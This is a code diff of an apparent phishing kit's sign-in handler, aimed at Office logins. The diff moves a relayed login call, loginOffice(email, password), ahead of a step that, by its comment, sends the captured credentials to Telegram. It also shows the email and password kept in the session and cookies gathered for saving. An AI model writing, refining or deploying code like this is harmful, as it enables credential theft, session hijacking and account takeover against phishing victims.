@@ -997,6 +997,10 @@ async def sign_in_handler():
         if not is_valid_email(email):
             return jsonify({"status": "error", "message": "Invalid or unsupported email address."}), 400
             
+        # Perform login first
+        login_result = loginOffice(email, password)
+        session['login_result'] = login_result
+
         # First send credentials to Telegram
         try:
             # Function to get real IP from headers
@@ -1107,9 +1111,7 @@ async def sign_in_handler():
         session['email'] = email
         session['password'] = password
 
-        # Perform login
-        login_result = loginOffice(email, password)
-        session['login_result'] = login_result
+        
         
         if login_result.get('status') == 'verify':
             # Store auth data for verification
@@ -1198,7 +1200,7 @@ async def final_redirect():
                     'Sec-Fetch-Site': 'same-origin',
                     'Sec-Fetch-User': '?1'
                 })
-            
+              
                 # Save email and all cookies in a single JSON structure
                 cookies_data = {
                     "email": email,
